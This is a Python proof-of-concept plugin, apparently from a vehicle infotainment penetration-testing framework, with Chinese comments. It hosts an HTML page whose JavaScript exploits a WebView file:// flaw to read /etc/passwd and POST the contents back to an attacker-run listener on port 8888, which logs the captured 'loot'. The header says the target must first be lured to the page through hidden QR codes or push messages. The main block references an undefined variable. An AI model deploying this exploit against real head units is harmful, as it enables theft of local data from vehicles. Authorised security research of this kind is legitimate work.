"""
PoC Name: WebView file:// Data Exfiltration
CVE: N/A
Component: Application Stack
Category: Application
Severity: Medium
CVSS: 5.0
Description: WebView file:// URI访问窃取本地数据库
Prerequisites: 车内网络可达，需要先诱导车机由于其他漏洞(例如隐蔽的二维码/推送)打开此服务器托管的 HTML。
Usage: python3 54_WebView_File_Exfil.py <bind_ip>
"""
import sys
import os
import time
import http.server
import threading
from iv_plugin_base import IVIVulnerabilityPlugin

EXPLOIT_HTML = '''<!DOCTYPE html>
<html>
<head>
    <title>IVI WebView Exploit</title>
</head>
<body>
    <h2>Loading IVI Experience...</h2>
    <script>
        // Use WebView file:// protocol flaw to exfiltrate /etc/shadow or local DB
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'file:///etc/passwd', true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                // Send stolen data back to the attacker's web server
                var exfil = new XMLHttpRequest();
                exfil.open('POST', '/receive_loot', true);
                exfil.send(xhr.responseText || "Vulnerable: Accessed empty/forbidden local file.");
            }
        };
        xhr.send();
    </script>
</body>
</html>
'''

class WebViewExfilPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        self.bind_ip = self.params.get("target_ip", "0.0.0.0")
        if self.bind_ip == "N/A":
             self.bind_ip = "0.0.0.0"
        return True

    def exploit(self):
        self.logger.info("准备托管 WebKit/WebView 利用负载服务器...")
        
        # 写入真实落地的利用文件
        payload_dir = "/tmp/ivi_webview_poc"
        os.makedirs(payload_dir, exist_ok=True)
        html_path = os.path.join(payload_dir, "exploit.html")
        with open(html_path, "w") as f:
            f.write(EXPLOIT_HTML)
        self.logger.info(f"成功生成恶意网页负载: {html_path}")
        
        # 定义内联 HTTP 接受器以接收车机偷取后发回的数据
        captured_data = []
        host_plugin = self
        
        class LootHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=payload_dir, **kwargs)
                
            def log_message(self, format, *args):
                pass
                
            def do_POST(self):
                if self.path == '/receive_loot':
                    content_len = int(self.headers.get('Content-Length', 0))
                    post_body = self.rfile.read(content_len).decode('utf-8', errors='ignore')
                    host_plugin.logger.warning(f"[!] 攻击成功！收到由车机 WebView 跨域回传的本地文件内容！")
                    host_plugin.logger.warning(f"  [LOOT] {post_body[:100]}...")
                    captured_data.append(post_body)
                    self.send_response(200)
                    self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()
        
        try:
            listen_port = 8888
            server = http.server.HTTPServer((self.bind_ip, listen_port), LootHandler)
            
            self.logger.info(f"恶意 Web 漏洞利用服务器已启动在 {self.bind_ip}:{listen_port}")
            self.logger.info(f"请诱导目标 IVI 系统访问: http://{self.bind_ip}:{listen_port}/exploit.html")
            
            # 开启线程监听 15 秒钟
            server_thread = threading.Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            
            for i in range(15):
                if captured_data:
                    break
                self.logger.info(f"等待车机访问漏洞页面并在后台执行... ({i+1}/15)")
                time.sleep(1)
                
            server.shutdown()
            
            if captured_data:
                 return {
                     "status": "success",
                     "vulnerable": True,
                     "details": "Successfully exfiltrated local files from WebView.",
                     "evidence": captured_data[0]
                 }
            else:
                 self.logger.info("倒计时结束，车间浏览器并未访问该页面。")
                 return {
                     "status": "success",
                     "vulnerable": False,
                     "details": "Target did not visit the exploit page."
                 }
                 
        except Exception as e:
             self.logger.error(f"Failed to start HTTPServer: {e}")
             return {
                 "status": "error",
                 "details": str(e)
             }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 54_WebView_File_Exfil.py <bind_ip>")
        sys.exit(1)
    plugin = WebViewExfilPlugin({"target_ip": ip})
    plugin.run_verify()
